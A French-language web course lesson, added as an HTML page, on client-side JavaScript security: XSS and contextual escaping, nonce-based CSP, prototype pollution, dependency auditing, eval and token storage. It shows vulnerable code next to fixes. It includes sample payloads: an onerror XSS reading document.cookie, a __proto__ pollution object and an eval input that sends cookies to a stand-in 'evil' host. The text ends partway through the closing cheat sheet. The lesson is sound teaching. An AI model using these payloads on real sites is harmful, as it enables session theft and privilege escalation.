@@ -1,0 +1,513 @@
+<!DOCTYPE html>
+<html lang="fr" data-theme="light">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>La sécurité côté client — Leçon 59 · Syntaxe</title>
+    <meta name="description" content="Sécurité front : XSS et échappement contextuel, CSP à nonce, prototype pollution, supply chain, eval, stockage de jetons et clickjacking côté client." />
+    <link rel="icon" type="image/svg+xml" href="../../assets/img/favicon.svg" />
+
+    <script src="../../js/theme.js"></script>
+
+    <link rel="stylesheet" href="../../css/fonts.css" />
+
+    <link rel="stylesheet" href="../../css/variables.css" />
+    <link rel="stylesheet" href="../../css/base.css" />
+    <link rel="stylesheet" href="../../css/layout.css" />
+    <link rel="stylesheet" href="../../css/components.css" />
+    <link rel="stylesheet" href="../../css/pages.css" />
+  </head>
+
+  <body data-course="javascript" data-lesson="lecon-59.html">
+    <a class="skip-link" href="#contenu">Aller au contenu</a>
+
+    <header class="site-header">
+      <div class="container--wide container site-header__inner">
+        <a class="brand" href="../../index.html" aria-label="Syntaxe — accueil">
+          <svg class="brand__mark" viewBox="0 0 32 32" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+            <rect x="3" y="3" width="26" height="26" rx="8" /><path d="M13 12 L9 16 L13 20" /><path d="M19 12 L23 16 L19 20" />
+          </svg>
+          <span>Syntaxe<span class="brand__dot" aria-hidden="true">.</span></span>
+        </a>
+        <button class="nav-toggle" data-nav-toggle aria-expanded="false" aria-controls="primary-nav" aria-label="Ouvrir le menu de navigation">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="M3 6h18M3 12h18M3 18h18" /></svg>
+        </button>
+        <nav class="primary-nav" id="primary-nav" aria-label="Navigation principale">
+          <a href="../../index.html">Accueil</a>
+          <a href="../catalogue.html">Catalogue</a>
+        </nav>
+        <div class="header-actions">
+          <button class="theme-toggle" data-theme-toggle aria-label="Activer le thème sombre">
+            <svg class="icon icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8Z" /></svg>
+            <svg class="icon icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><circle cx="12" cy="12" r="4.5" /><path d="M12 2v2M12 20v2M2 12h2M20 12h2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M19.1 4.9l-1.4 1.4M6.3 17.7l-1.4 1.4" /></svg>
+          </button>
+        </div>
+      </div>
+    </header>
+
+    <div class="reading-progress" data-reading-progress aria-hidden="true"></div>
+
+    <main id="contenu">
+      <div class="container container--wide">
+        <nav class="breadcrumb-nav" aria-label="Fil d'Ariane">
+          <ol class="breadcrumb">
+            <li><a href="../../index.html">Accueil</a></li>
+            <li><a href="../catalogue.html">Catalogue</a></li>
+            <li><a href="cours.html">JavaScript</a></li>
+            <li aria-current="page">Leçon 59</li>
+          </ol>
+        </nav>
+
+        <div class="lesson-layout">
+          <aside class="lesson-rail lesson-coursenav" data-coursenav-host aria-label="Plan du cours">
+            <button class="coursenav-toggle" data-coursenav-toggle aria-expanded="false">
+              <span>Plan du cours</span>
+              <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="M6 9l6 6 6-6" /></svg>
+            </button>
+            <div class="coursenav-panel"><div data-coursenav></div></div>
+          </aside>
+
+          <div class="lesson-main">
+            <header class="lesson-header">
+              <p class="kicker">Module 19 · Aux frontières de JavaScript — Leçon 59</p>
+              <h1 class="lesson-header__title">La sécurité côté client</h1>
+              <div class="meta-row">
+                <span class="duration">
+                  <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><circle cx="12" cy="12" r="9" /><path d="M12 7v5l3 2" /></svg>
+                  ~36 min
+                </span>
+                <span class="dot-sep"><span class="pill pill--avance">Avancé</span></span>
+                <span class="dot-sep">Leçon 16 recommandée</span>
+              </div>
+
+              <div class="objectives">
+                <p class="objectives__title">À la fin de cette leçon, tu sauras</p>
+                <ul>
+                  <li>savoir neutraliser le <strong>XSS</strong> par échappement contextuel, <code>textContent</code>, DOMPurify et Trusted Types&nbsp;;</li>
+                  <li>savoir durcir une <strong>CSP</strong> (nonce, hashes, suppression de l'inline) et comprendre le rôle de l'en-tête&nbsp;;</li>
+                  <li>savoir défendre un merge/parse contre la <strong>prototype pollution</strong> et auditer la chaîne de dépendances&nbsp;;</li>
+                  <li>savoir choisir le stockage des jetons et bannir <code>eval</code>/<code>Function</code> pour réduire la surface d'attaque.</li>
+                </ul>
+              </div>
+            </header>
+
+            <details class="toc-inline" open>
+              <summary>Sommaire de la leçon</summary>
+              <nav class="toc" aria-label="Sommaire de la leçon"><div data-toc></div></nav>
+            </details>
+
+            <article class="prose">
+<p>Tu maîtrises l'event loop, les Proxy et les flux async, mais une application front impeccablement architecturée reste exploitable si elle injecte du DOM sans précaution, expose ses jetons ou fait confiance à une dépendance compromise. La sécurité côté client n'est pas une couche que l'on ajoute&nbsp;: c'est un invariant que chaque écriture dans le DOM, chaque <code>fetch</code> et chaque <code>import</code> peut briser. Le modèle de menace est particulier&nbsp;: tout le code s'exécute chez l'attaquant potentiel, donc <strong>aucune vérification côté client n'est une garantie de sécurité</strong>, seulement une amélioration d'UX.</p>
+<p>Cette leçon couvre les vecteurs concrets — XSS, prototype pollution, supply chain, <code>eval</code>, vol de jetons, clickjacking — avec le mauvais code, le bon code et la défense en profondeur qui survit à une erreur isolée.</p>
+
+<h2>XSS en profondeur et échappement contextuel</h2>
+<p>Le XSS se décline en trois familles&nbsp;: <strong>stocké</strong> (la charge persiste en base et est resservie à tous), <strong>réfléchi</strong> (la charge transite par l'URL et revient dans la réponse), et <strong>DOM-based</strong> (la charge ne touche jamais le serveur, elle naît d'un <em>sink</em> côté client comme <code>innerHTML</code> alimenté par <code>location.hash</code>). C'est cette troisième famille qui te concerne le plus en tant qu'expert front&nbsp;: elle vit entièrement dans ton JavaScript, hors de portée des protections serveur.</p>
+
+<figure class="diagram">
+  <svg viewBox="0 0 640 205" role="img" aria-label="Les trois familles de XSS et le lieu où naît l'exécution. Le XSS stocké : la charge postée est stockée en base de données côté serveur puis resservie à tous les utilisateurs. Le XSS réfléchi : la charge placée dans l'URL est renvoyée par le serveur dans la réponse et s'exécute chez une victime. Le XSS DOM-based : la charge dans l'URL est lue par le JavaScript client et atteint un sink comme innerHTML, sans jamais toucher le serveur.">
+    <text class="d-label" x="16" y="24" font-size="13">Les trois familles de XSS : où naît l'exécution</text>
+    <text class="d-mut" x="166" y="44" text-anchor="middle" font-size="9">Origine de la charge</text>
+    <text class="d-mut" x="304" y="44" text-anchor="middle" font-size="9">Traitement</text>
+    <text class="d-mut" x="463" y="44" text-anchor="middle" font-size="9">Exécution</text>
+
+    <text class="d-mut" x="16" y="73" font-size="11">Stocké</text>
+    <rect class="d-box" x="110" y="52" width="112" height="34" rx="5" /><text class="d-text" x="166" y="73" text-anchor="middle" font-size="9">Charge postée</text>
+    <path class="d-line" d="M222 69 H238" />
+    <rect class="d-accent" x="240" y="52" width="128" height="34" rx="5" /><text class="d-text" x="304" y="73" text-anchor="middle" font-size="9">Stockée en BDD</text>
+    <path class="d-line" d="M368 69 H384" />
+    <rect class="d-box" x="386" y="52" width="154" height="34" rx="5" /><text class="d-text" x="463" y="73" text-anchor="middle" font-size="9">Servie à tous</text>
+
+    <text class="d-mut" x="16" y="125" font-size="11">Réfléchi</text>
+    <rect class="d-box" x="110" y="104" width="112" height="34" rx="5" /><text class="d-text" x="166" y="125" text-anchor="middle" font-size="9">Charge dans l'URL</text>
+    <path class="d-line" d="M222 121 H238" />
+    <rect class="d-accent" x="240" y="104" width="128" height="34" rx="5" /><text class="d-text" x="304" y="125" text-anchor="middle" font-size="9">Renvoyée par le serveur</text>
+    <path class="d-line" d="M368 121 H384" />
+    <rect class="d-box" x="386" y="104" width="154" height="34" rx="5" /><text class="d-text" x="463" y="125" text-anchor="middle" font-size="9">Exécutée (1 victime)</text>
+
+    <text class="d-mut" x="16" y="177" font-size="11">DOM-based</text>
+    <rect class="d-box" x="110" y="156" width="112" height="34" rx="5" /><text class="d-text" x="166" y="177" text-anchor="middle" font-size="9">Charge dans l'URL / #</text>
+    <path class="d-line" d="M222 173 H238" />
+    <rect class="d-accent" x="240" y="156" width="128" height="34" rx="5" /><text class="d-text" x="304" y="177" text-anchor="middle" font-size="9">Lue par le JS client</text>
+    <path class="d-line" d="M368 173 H384" />
+    <rect class="d-accent" x="386" y="156" width="154" height="34" rx="5" /><text class="d-text" x="463" y="177" text-anchor="middle" font-size="9">Sink innerHTML</text>
+  </svg>
+  <figcaption>Le XSS <strong>stocké</strong> et <strong>réfléchi</strong> passent par le serveur&nbsp;; le <strong>DOM-based</strong> vit entièrement dans ton JavaScript — la charge va de l'URL au sink (<code>innerHTML</code>) sans jamais toucher le serveur, donc hors de portée des protections back-end.</figcaption>
+</figure>
+
+<figure class="code-block" data-file="app.js"><pre><code class="language-javascript">// MAUVAIS : sink DOM-based classique
+const q = new URLSearchParams(location.search).get('q');
+results.innerHTML = `Résultats pour : ${q}`;
+// ?q=&lt;img src=x onerror=alert(document.cookie)&gt; =&gt; exécution
+
+// BON : textContent ne parse jamais de HTML
+results.textContent = `Résultats pour : ${q}`;
+// le &lt;img&gt; devient du texte affiché, inerte</code></pre></figure>
+<p>La règle fondamentale est que l'<strong>échappement dépend du contexte d'insertion</strong>. Une même donnée n'a pas le même échappement dans un corps HTML, dans un attribut, dans une URL ou dans un littéral JS&nbsp;: échapper pour le mauvais contexte ne protège pas, et peut même ouvrir une brèche.</p>
+<figure class="code-block" data-file="app.js"><pre><code class="language-javascript">// Quatre contextes, quatre échappements distincts
+const escapeHTML = (s) =&gt;
+  s.replace(/[&amp;&lt;&gt;"']/g, (c) =&gt; ({
+    '&amp;': '&amp;amp;', '&lt;': '&amp;lt;', '&gt;': '&amp;gt;',
+    '"': '&amp;quot;', "'": '&amp;#39;'
+  }[c]));
+
+// 1. Corps HTML  -&gt; escapeHTML(data)
+// 2. Attribut    -&gt; escapeHTML + TOUJOURS guillemets : title="..."
+// 3. URL         -&gt; encodeURIComponent(data) (jamais escapeHTML seul)
+// 4. Contexte JS -&gt; ne JAMAIS injecter ; sérialiser via JSON.stringify
+
+const safeURL = `/search?q=${encodeURIComponent(q)}`;
+// q='a&amp;b=c' =&gt; q=a%26b%3Dc, pas d'évasion de paramètre</code></pre></figure>
+<p>Quand tu dois réellement insérer du HTML riche (un éditeur WYSIWYG, du Markdown rendu), l'échappement ne suffit plus&nbsp;: il faut <strong>sanitizer</strong>. N'écris jamais ton propre filtre par regex — la grammaire HTML est trop hostile (commentaires conditionnels, entités, <code>mXSS</code> par re-parsing). Utilise <strong>DOMPurify</strong>, maintenu et durci contre ces évasions.</p>
+<figure class="code-block" data-file="app.js"><pre><code class="language-javascript">import DOMPurify from 'dompurify';
+
+const dirty = userMarkdownToHTML(input); // contient peut-être &lt;script&gt;
+const clean = DOMPurify.sanitize(dirty, {
+  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'ul', 'li'],
+  ALLOWED_ATTR: ['href'],
+});
+container.innerHTML = clean; // &lt;script&gt; et onerror=... supprimés</code></pre></figure>
+<p>Le cran au-dessus est <strong>Trusted Types</strong>&nbsp;: une API navigateur qui transforme les sinks dangereux (<code>innerHTML</code>, <code>script.src</code>…) en erreur de type sauf si on leur passe un objet produit par une <em>policy</em> explicite. Cela rend le XSS DOM-based <em>structurellement</em> impossible plutôt que de compter sur la discipline.</p>
+<figure class="code-block" data-file="app.js"><pre><code class="language-javascript">// Activé via l'en-tête : Content-Security-Policy: require-trusted-types-for 'script'
+const policy = trustedTypes.createPolicy('app-html', {
+  createHTML: (s) =&gt; DOMPurify.sanitize(s),
+});
+
+el.innerHTML = policy.createHTML(dirty); // OK : TrustedHTML accepté
+el.innerHTML = dirty;                    // TypeError : string interdite
+// =&gt; impossible d'oublier la sanitization : le moteur l'impose</code></pre></figure>
+
+<h2>La CSP côté client</h2>
+<p>La <strong>Content-Security-Policy</strong> est une seconde ligne de défense&nbsp;: même si une injection passe, la CSP peut empêcher le code injecté de s'exécuter. Elle se transmet via un en-tête HTTP (préférable) ou une balise <code>meta</code>. Le levier décisif est de <strong>bloquer le inline</strong>&nbsp;: sans <code>'unsafe-inline'</code>, un <code>onerror=...</code> ou un <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> injecté ne tourne pas.</p>
+
+<figure class="diagram">
+  <svg viewBox="0 0 640 200" role="img" aria-label="Le fonctionnement d'une CSP à nonce. L'en-tête de réponse déclare script-src self et nonce-r4nd0m. Le script prévu par la page porte l'attribut nonce égal à r4nd0m : le navigateur le compare, il correspond, le script s'exécute. Un script injecté par une attaque ne connaît pas le nonce du jour : le navigateur ne trouve pas de correspondance et refuse de l'exécuter.">
+    <text class="d-label" x="16" y="24" font-size="13">La CSP à nonce : seul le nonce du jour s'exécute</text>
+    <rect class="d-frame" x="120" y="38" width="400" height="30" rx="5" /><text class="d-tag" x="320" y="57" text-anchor="middle" font-size="10">En-tête : script-src 'self' 'nonce-r4nd0m'</text>
+    <path class="d-line" d="M200 68 V92" /><path class="d-line" d="M440 68 V92" />
+
+    <rect class="d-box" x="40" y="94" width="230" height="40" rx="5" /><text class="d-text" x="155" y="112" text-anchor="middle" font-size="10">&lt;script nonce="r4nd0m"&gt;</text><text class="d-mut" x="155" y="127" text-anchor="middle" font-size="9">script prévu par la page</text>
+    <path class="d-line" d="M155 134 V158" />
+    <rect class="d-accent" x="55" y="160" width="200" height="30" rx="5" /><text class="d-text" x="155" y="179" text-anchor="middle" font-size="10">✓ exécuté — nonce valide</text>
+
+    <rect class="d-box" x="370" y="94" width="230" height="40" rx="5" /><text class="d-text" x="485" y="112" text-anchor="middle" font-size="10">&lt;script&gt;alert(1)&lt;/script&gt;</text><text class="d-mut" x="485" y="127" text-anchor="middle" font-size="9">injecté par l'attaquant</text>
+    <path class="d-line" d="M485 134 V158" />
+    <rect class="d-frame" x="385" y="160" width="200" height="30" rx="5" /><text class="d-mut" x="485" y="179" text-anchor="middle" font-size="10">✗ bloqué — pas de nonce</text>
+  </svg>
+  <figcaption>Le nonce, imprévisible et régénéré à chaque réponse, est apposé sur les scripts légitimes. Un script injecté ne peut pas le deviner&nbsp;: sans <code>'unsafe-inline'</code>, le navigateur refuse tout script inline dépourvu du bon nonce.</figcaption>
+</figure>
+
+<figure class="code-block" data-file="app.js"><pre><code class="language-javascript">// En-tête (Express). Le nonce est régénéré à CHAQUE réponse.
+app.use((req, res, next) =&gt; {
+  const nonce = crypto.randomBytes(16).toString('base64');
+  res.locals.nonce = nonce;
+  res.setHeader('Content-Security-Policy', [
+    "default-src 'self'",
+    `script-src 'self' 'nonce-${nonce}'`, // pas d'unsafe-inline
+    "object-src 'none'",
+    "base-uri 'none'",                    // bloque le vol via &lt;base&gt;
+  ].join('; '));
+  next();
+});
+// Côté HTML : &lt;script nonce="{{nonce}}"&gt;...&lt;/script&gt; s'exécute,
+// tout &lt;script&gt; injecté SANS le bon nonce est refusé.</code></pre></figure>
+<p>Pour des scripts statiques sans nonce, on autorise par <strong>hash</strong> (<code>'sha256-...'</code> du contenu exact). Nonce et hash sont les deux moyens propres de garder du contrôle fin sans réactiver <code>'unsafe-inline'</code>, qui annulerait la protection. Note d'ailleurs qu'un navigateur moderne <em>ignore</em> <code>'unsafe-inline'</code> dès qu'un nonce ou un hash est présent&nbsp;: les deux ne coexistent pas, c'est un mécanisme de repli pour anciens agents.</p>
+<div class="callout callout--note"><svg class="callout__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><circle cx="12" cy="12" r="9" /><path d="M12 8h.01M11 12h1v4h1" /></svg><div class="callout__body"><p class="callout__title">Note</p><p>Un nonce DOIT être imprévisible et unique par réponse. Un nonce constant ou recyclé d'une page à l'autre est trivialement contournable&nbsp;: l'attaquant le lit dans le DOM et l'appose à son script injecté.</p></div></div>
+
+<h2>Prototype pollution</h2>
+<p>Cette vulnérabilité spécifique à JavaScript exploite le fait que la clé <code>__proto__</code>, dans un objet littéral parsé, désigne <code>Object.prototype</code>. Un merge récursif ou un parseur naïf de query-string qui copie une clé <code>__proto__</code> <strong>pollue tous les objets du programme</strong>, ce qui mène à des contournements d'authentification, du déni de service, voire du RCE si une clé polluée alimente un template ou un <code>child_process</code>.</p>
+<figure class="code-block" data-file="app.js"><pre><code class="language-javascript">// MAUVAIS : merge récursif non protégé
+function merge(target, src) {
+  for (const k in src) {
+    if (typeof src[k] === 'object' &amp;&amp; src[k] !== null) {
+      target[k] ??= {};
+      merge(target[k], src[k]); // descend dans __proto__
+    } else {
+      target[k] = src[k];
+    }
+  }
+  return target;
+}
+
+merge({}, JSON.parse('{"__proto__": {"isAdmin": true}}'));
+console.log(({}).isAdmin); // true  =&gt; TOUT objet est désormais admin</code></pre></figure>
+<figure class="code-block" data-file="app.js"><pre><code class="language-javascript">// BON : filtrer les clés dangereuses + objets sans prototype
+const FORBIDDEN = new Set(['__proto__', 'constructor', 'prototype']);
+
+function safeMerge(target, src) {
+  for (const k of Object.keys(src)) {       // pas de for..in (chaîne)
+    if (FORBIDDEN.has(k)) continue;          // on saute la pollution
+    const v = src[k];
+    if (v &amp;&amp; typeof v === 'object' &amp;&amp; !Array.isArray(v)) {
+      target[k] = safeMerge(
+        Object.create(null),                 // objet SANS prototype
+        v
+      );
+    } else {
+      target[k] = v;
+    }
+  }
+  return target;
+}
+
+safeMerge({}, JSON.parse('{"__proto__":{"isAdmin":true}}'));
+console.log(({}).isAdmin); // undefined  =&gt; prototype intact</code></pre></figure>
+<p>Les défenses complémentaires&nbsp;: utiliser une <code>Map</code> plutôt qu'un objet pour des clés issues de l'utilisateur (les clés n'interagissent pas avec le prototype), <strong>geler</strong> le prototype avec <code>Object.freeze(Object.prototype)</code> en amont, et valider la forme des entrées par un schéma (Zod, Ajv) avant tout traitement.</p>
+
+<h2>Sécurité de la chaîne de dépendances</h2>
+<p>Une application front moderne tire des centaines de paquets transitifs&nbsp;: chacun s'exécute avec tes privilèges. Les vecteurs supply chain sont le <strong>typosquatting</strong> (un paquet légitime <code>cross-env</code> contre un malveillant <code>crossenv</code>), la compromission d'un mainteneur, et l'injection dans une version mineure. La discipline minimale&nbsp;:</p>
+<figure class="code-block" data-file="Terminal"><pre><code class="language-bash"># Audite les vulnérabilités connues de l'arbre de dépendances
+npm audit --audit-level=high
+
+# Échoue la CI si une faille high/critical existe
+npm audit --audit-level=high || exit 1
+
+# Vérifie un nom suspect AVANT d'installer (typosquatting)
+npm view crossenv  # inexistant/louche =&gt; ne pas installer</code></pre></figure>
+<p class="code-caption">Intègre <code>npm audit</code> à la CI pour bloquer toute régression de sécurité.</p>
+<p>Pour les ressources chargées depuis un CDN, l'attribut <strong>SRI</strong> (<code>integrity</code>) garantit que le fichier servi correspond bien au hash attendu&nbsp;: si le CDN est compromis et sert un script altéré, le navigateur refuse de l'exécuter.</p>
+<figure class="code-block" data-file="app.js"><pre><code class="language-javascript">// HTML : Subresource Integrity sur une ressource externe
+// &lt;script src="https://cdn.example/lib.js"
+//   integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6R9GqQ8Kuxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
+//   crossorigin="anonymous"&gt;&lt;/script&gt;
+// hash divergent =&gt; le navigateur bloque le chargement</code></pre></figure>
+<div class="callout callout--note"><svg class="callout__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><circle cx="12" cy="12" r="9" /><path d="M12 8h.01M11 12h1v4h1" /></svg><div class="callout__body"><p class="callout__title">Cas réel</p><p>En 2018, l'attaque <strong>Magecart contre British Airways</strong> a compromis un script tiers déjà chargé par le site&nbsp;: une vingtaine de lignes de JavaScript injectées ont copié, à la volée, les données de carte saisies dans le formulaire de paiement et les ont exfiltrées vers un domaine ressemblant. Environ <strong>380&nbsp;000 transactions</strong> ont fuité, avec à la clé une sanction retentissante de l'autorité britannique (ICO). Le vecteur n'était ni le serveur ni la base&nbsp;: du <em>JavaScript côté client</em> altéré. Les parades exactes de cette leçon l'auraient stoppé — <strong>SRI</strong> sur le script tiers (hash divergent =&gt; blocage), une <strong>CSP</strong> à <code>connect-src</code> restreint (exfiltration refusée) et la minimisation des scripts tiers sur les pages sensibles.</p></div></div>
+<div class="callout callout--tip"><svg class="callout__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="M9 18h6M10 22h4M12 2a7 7 0 0 0-4 12c.7.7 1 1.2 1 2h6c0-.8.3-1.3 1-2a7 7 0 0 0-4-12Z" /></svg><div class="callout__body"><p class="callout__title">Astuce</p><p>La meilleure dépendance est celle que tu n'installes pas. Pour un besoin trivial (un <code>leftpad</code>, un <code>debounce</code>), écris quelques lignes&nbsp;: tu réduis la surface d'attaque, le poids du bundle et le risque de typosquatting d'un coup.</p></div></div>
+
+<h2>eval, Function et setTimeout(string)</h2>
+<p><code>eval</code>, le constructeur <code>Function</code> et la forme <code>setTimeout("code", ...)</code> compilent une chaîne en code. Dès qu'une partie de cette chaîne dérive d'une entrée, tu as un XSS/RCE direct. Ils sont aussi non optimisables par le moteur et incompatibles avec une CSP stricte (qui requiert <code>'unsafe-eval'</code> pour les autoriser — signal d'alarme à lui seul).</p>
+<figure class="code-block" data-file="app.js"><pre><code class="language-javascript">// MAUVAIS : exécution d'entrée arbitraire
+const expr = input.value;          // "fetch('//evil/?c='+document.cookie)"
+const r = eval(expr);              // exfiltration immédiate
+setTimeout('doStuff(' + input.value + ')', 100); // idem, forme string
+
+// BON : pas de compilation de chaîne
+const out = computeFrom(parsed);   // logique dédiée, données typées
+setTimeout(() =&gt; doStuff(arg), 100); // fonction, pas de string
+
+// Calcul dynamique légitime ? Un parseur restreint, jamais eval :
+const ops = { add: (a, b) =&gt; a + b, mul: (a, b) =&gt; a * b };
+const safeCompute = (op, a, b) =&gt; ops[op]?.(a, b) ?? null;</code></pre></figure>
+
+<h2>Jetons, CSRF/CORS et clickjacking</h2>
+<p>Le stockage des jetons est un arbitrage souvent mal tranché. <code>localStorage</code> est lisible par <strong>tout</strong> JavaScript de la page&nbsp;: un seul XSS et le JWT part en exfiltration. Un cookie <code>HttpOnly</code> est inaccessible au JS, donc immunisé contre le vol par XSS — au prix d'une exposition CSRF que l'on neutralise avec <code>SameSite</code> et un jeton anti-CSRF.</p>
+
+<figure class="diagram">
+  <svg viewBox="0 0 640 205" role="img" aria-label="Comparaison du stockage d'un jeton. À gauche, le jeton en localStorage est lisible par n'importe quel script, y compris un script injecté par XSS, qui peut le lire et l'envoyer à l'attaquant : un seul XSS suffit à voler le jeton. À droite, le jeton est dans un cookie HttpOnly que le JavaScript ne peut pas lire ; un XSS ne peut donc pas le voler. Le cookie est joint automatiquement aux requêtes, ce qui laisse un risque CSRF couvert par l'attribut SameSite.">
+    <text class="d-label" x="16" y="24" font-size="13">Ranger un jeton : à portée du JavaScript, ou hors d'atteinte ?</text>
+    <text class="d-mut" x="150" y="44" text-anchor="middle" font-size="10">localStorage</text>
+    <text class="d-mut" x="490" y="44" text-anchor="middle" font-size="10">Cookie HttpOnly</text>
+
+    <rect class="d-frame" x="30" y="54" width="240" height="114" rx="6" />
+    <rect class="d-box" x="90" y="68" width="120" height="30" rx="4" /><text class="d-text" x="150" y="87" text-anchor="middle" font-size="10">JWT (lisible)</text>
+    <rect class="d-box" x="70" y="124" width="160" height="30" rx="4" /><text class="d-text" x="150" y="143" text-anchor="middle" font-size="9">script JS / XSS</text>
+    <path class="d-line" d="M150 124 V98" /><text class="d-mut" x="176" y="114" font-size="9">lit &amp; envoie</text>
+    <text class="d-tag" x="150" y="188" text-anchor="middle" font-size="10">Un seul XSS vole le jeton</text>
+
+    <rect class="d-frame" x="370" y="54" width="240" height="114" rx="6" />
+    <rect class="d-accent" x="430" y="68" width="120" height="30" rx="4" /><text class="d-text" x="490" y="87" text-anchor="middle" font-size="9">session (HttpOnly)</text>
+    <rect class="d-box" x="410" y="124" width="160" height="30" rx="4" /><text class="d-text" x="490" y="143" text-anchor="middle" font-size="9">script JS</text>
+    <path class="d-line" d="M490 124 V98" /><text class="d-mut" x="516" y="114" font-size="9">✗ ne lit pas</text>
+    <text class="d-mut" x="490" y="188" text-anchor="middle" font-size="10">Invisible au JS ; CSRF ← SameSite</text>
+  </svg>
+  <figcaption><code>localStorage</code> est lisible par <strong>tout</strong> script&nbsp;: un seul XSS exfiltre le jeton. Un cookie <code>HttpOnly</code> échappe au JavaScript (donc au vol par XSS)&nbsp;; il part automatiquement avec les requêtes, d'où un risque CSRF que l'on couvre avec <code>SameSite</code>.</figcaption>
+</figure>
+
+<figure class="code-block" data-file="app.js"><pre><code class="language-javascript">// MAUVAIS : JWT en localStorage, volable par XSS
+localStorage.setItem('jwt', token);
+fetch('/api', { headers: { Authorization: `Bearer ${token}` } });
+
+// BON (côté serveur) : cookie inaccessible au JS
+// Set-Cookie: session=...; HttpOnly; Secure; SameSite=Strict; Path=/
+fetch('/api', { credentials: 'same-origin' });
+// le navigateur joint le cookie ; aucun JS ne peut le lire =&gt; pas de vol XSS</code></pre></figure>
+<p>Côté <strong>CORS</strong>, rappelle-toi que c'est une politique de <em>lecture cross-origin</em> imposée par le navigateur, pas un contrôle d'accès&nbsp;: <code>Access-Control-Allow-Origin: *</code> sur une API authentifiée par cookie est une faute. Et n'utilise jamais <code>credentials: 'include'</code> avec un origin générique. Contre le <strong>clickjacking</strong>, le serveur doit envoyer <code>X-Frame-Options: DENY</code> ou la directive CSP <code>frame-ancestors 'none'</code> pour interdire l'iframe de ton app par un site piège.</p>
+
+<h2>Bonnes pratiques transversales</h2>
+<p>Deux principes dominent. Le <strong>moindre privilège</strong>&nbsp;: un token au scope minimal, une CSP qui n'autorise que les origines réellement utilisées, des appels <code>postMessage</code> avec <code>targetOrigin</code> explicite (jamais <code>'*'</code> pour des données sensibles). Et la <strong>validation côté serveur AUSSI</strong>&nbsp;: la validation client améliore l'UX mais n'a aucune valeur de sécurité, puisque l'attaquant contrôle entièrement le client.</p>
+<figure class="code-block" data-file="app.js"><pre><code class="language-javascript">// postMessage : toujours vérifier l'origine émettrice
+window.addEventListener('message', (e) =&gt; {
+  if (e.origin !== 'https://app.exemple.fr') return; // rejet strict
+  handle(e.data);
+});
+// Émission : cibler une origine précise, pas '*'
+iframe.contentWindow.postMessage(payload, 'https://app.exemple.fr');</code></pre></figure>
+
+<h2>Pièges fréquents</h2>
+<div class="callout callout--warn"><svg class="callout__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="M10.3 3.9 1.8 18a2 2 0 0 0 1.7 3h17a2 2 0 0 0 1.7-3L13.7 3.9a2 2 0 0 0-3.4 0Z" /><path d="M12 9v4M12 17h.01" /></svg><div class="callout__body"><p class="callout__title">Piège fréquent</p><p><code>innerHTML</code> avec une donnée utilisateur reste le XSS numéro un. Même « juste un nom », même « déjà validé au formulaire »&nbsp;: si la valeur peut transiter par une autre voie (API, import, ancien enregistrement), elle est non fiable. Réflexe&nbsp;: <code>textContent</code> par défaut, sanitization explicite sinon.</p></div></div>
+<div class="callout callout--warn"><svg class="callout__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="M10.3 3.9 1.8 18a2 2 0 0 0 1.7 3h17a2 2 0 0 0 1.7-3L13.7 3.9a2 2 0 0 0-3.4 0Z" /><path d="M12 9v4M12 17h.01" /></svg><div class="callout__body"><p class="callout__title">Piège fréquent</p><p>Se reposer sur la validation client seule, stocker un JWT en <code>localStorage</code>, faire un merge récursif non protégé, passer une entrée à <code>eval</code> ou installer une dépendance sans l'auditer&nbsp;: chacun, isolément, suffit à compromettre toute l'application. La défense en profondeur suppose qu'une couche tombera.</p></div></div>
+
+<h2>Pour aller plus loin</h2>
+<div class="callout callout--more"><svg class="callout__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="M12 3v14M5 10l7 7 7-7M5 21h14" /></svg><div class="callout__body"><p class="callout__title">Pour aller plus loin</p><p>Approfondis avec <strong>DOMPurify</strong> et la <strong>Trusted Types API</strong> pour neutraliser le XSS DOM-based, la <strong>CSP stricte à nonce</strong> (et son mode <code>report-only</code> pour migrer sans casser), <strong>Snyk</strong> / <code>npm audit</code> pour la supply chain, le <strong>Subresource Integrity</strong> pour les CDN, et le référentiel <strong>OWASP</strong> (Top 10, cheat sheets XSS et prototype pollution) comme socle de revue.</p></div></div>
+
+<h2>Antisèche</h2>
+<figure class="cheat-table">
+  <table>
+    <caption>Mémo&nbsp;: menaces côté client et parades</caption>
+    <thead><tr><th>Menace</th><th>Le réflexe qui la neutralise</th><th>Défense en profondeur</th></tr></thead>
+    <tbody>
+      <tr><td>XSS DOM-based</td><td><code>textContent</code> par défaut&nbsp;; <code>DOMPurify.sanitize()</code> pour du HTML riche</td><td>Trusted Types + CSP</td></tr>
+      <tr><td>Script injecté inline</td><td>CSP <code>script-src</code> par <strong>nonce</strong> unique (ou hash)</td><td>bannir <code>'unsafe-inline'</code></td></tr>
+      <tr><td>Prototype pollution</td><td>filtrer <code>__proto__</code>/<code>constructor</code>, <code>Object.create(null)</code></td><td><code>Map</code>, schéma (Zod/Ajv)</td></tr>
